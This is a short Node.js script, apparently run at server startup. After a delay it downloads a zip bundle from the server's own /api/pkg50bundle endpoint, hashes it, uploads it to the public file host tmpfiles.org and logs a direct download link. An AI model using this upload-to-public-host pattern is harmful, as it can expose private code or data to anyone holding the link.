const crypto=require('crypto');
setTimeout(async()=>{
  try{
    const port=process.env.PORT||10000;
    const base=`http://127.0.0.1:${port}`;
    const sr=await fetch(`${base}/api/pkg50bundle?status=1`);
    console.log(`PKG50_BUNDLE_STATUS status=${sr.status} body=${await sr.text()}`);
    const r=await fetch(`${base}/api/pkg50bundle`);
    if(!r.ok) throw new Error(`bundle HTTP ${r.status}`);
    const b=Buffer.from(await r.arrayBuffer());
    const sha=crypto.createHash('sha256').update(b).digest('hex');
    console.log(`PKG50_TMP_META bytes=${b.length} sha256=${sha}`);
    const fd=new FormData();
    fd.append('file',new Blob([b],{type:'application/zip'}),'pkg50.zip');
    const ur=await fetch('https://tmpfiles.org/api/v1/upload',{method:'POST',body:fd});
    const txt=await ur.text();
    console.log(`PKG50_TMP_UPLOAD status=${ur.status} body=${txt}`);
    try{
      const j=JSON.parse(txt);
      const page=j?.data?.url;
      if(page){
        const direct=page.replace(/^http:/,'https:').replace('tmpfiles.org/','tmpfiles.org/dl/');
        console.log(`PKG50_TMP_DIRECT=${direct}`);
      }
    }catch{}
  }catch(e){
    console.error('PKG50_TMP_ERROR '+e.stack);
  }
},8000);
